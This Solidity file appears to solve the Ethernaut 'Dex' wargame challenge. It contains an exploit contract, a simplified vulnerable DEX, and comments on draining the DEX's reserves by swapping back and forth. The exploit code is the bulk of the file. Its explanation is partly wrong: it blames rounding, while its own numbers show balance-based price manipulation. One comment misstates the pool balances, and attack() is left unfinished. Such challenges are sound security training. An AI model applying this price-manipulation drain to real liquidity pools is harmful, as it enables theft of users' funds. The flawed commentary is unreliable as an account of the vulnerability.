// Ethernaut Challenge #22: Dex
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * DEX CHALLENGE
 * 
 * Goal: Drain all tokens from the DEX.
 * 
 * THE VULNERABILITY:
 * Price calculation has rounding errors + no minimum liquidity.
 * 
 * The price formula: 
 *   getSwapPrice = amount * toBalance / fromBalance
 * 
 * This is a constant product AMM (x * y = k) simplified.
 * But with small pools, we can manipulate prices dramatically.
 * 
 * THE ATTACK:
 * By swapping back and forth, we exploit rounding in our favor
 * and drain the DEX token by token.
 * 
 * We start with 10 token1, 10 token2
 * DEX has 100 of each
 */

interface IERC20 {
    function transferFrom(address, address, uint) external returns (bool);
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

contract DexExploit {
    Dex public target;
    address public token1;
    address public token2;
    
    constructor(address _target) {
        target = Dex(_target);
        token1 = target.token1();
        token2 = target.token2();
    }
    
    function attack() external {
        // Approve DEX to spend our tokens
        IERC20(token1).approve(address(target), type(uint).max);
        IERC20(token2).approve(address(target), type(uint).max);
        
        // Alternate swaps to exploit rounding errors
        // Each swap drains a bit more due to integer division favoring us
        
        target.swap(token1, token2, 10);  // Swap all token1
        // Now we have ~20 token2, DEX depleted of token2
        
        target.swap(token2, token1, 20);  // Swap all token2  
        // Price manipulation continues...
        
        // Continue alternating until one token is drained
        // The key is that swap amount calculations round down,
        // consistently benefiting the attacker over many swaps
    }
}

contract Dex {
    address public token1;
    address public token2;
    
    function swap(address from, address to, uint amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough");
        
        uint swapAmount = getSwapPrice(from, to, amount);
        
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }
    
    function getSwapPrice(address from, address to, uint amount) public view returns (uint) {
        // VULNERABILITY: Integer division rounds down
        // No fee means no slippage protection
        return ((amount * IERC20(to).balanceOf(address(this))) / 
                IERC20(from).balanceOf(address(this)));
    }
    
    function approve(address spender, uint amount) public {
        // Swappable token approvals
    }
    
    function balanceOf(address token, address account) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

/*
 * ATTACK EXPLANATION:
 * 
 * Initial state:
 * - DEX: 100 token1, 100 token2
 * - Player: 10 token1, 10 token2
 * 
 * Swap 1: token1 → token2 (10)
 *   getPrice = 10 * 100 / 100 = 10 token2
 *   Player: 0 token1, 20 token2
 *   DEX: 110 token1, 90 token2
 * 
 * Swap 2: token2 → token1 (20)
 *   getPrice = 20 * 110 / 90 = 24 token1 (rounded)
 *   Player: 24 token1, 0 token2
 *   DEX: 86 token1, 110 token2
 * 
 * Notice: Started with 10+10=20, now have 24. Free money!
 * 
 * Continue alternating - each cycle extracts value due to
 * asymmetric price impact. Eventually drain one token completely.
 * 
 * LESSON:
 * - Small liquidity pools are vulnerable to manipulation
 * - Integer division creates rounding errors
 * - No minimum output = sandwich attack vulnerability
 * - Real AMMs use fees and minimum output amounts
 */
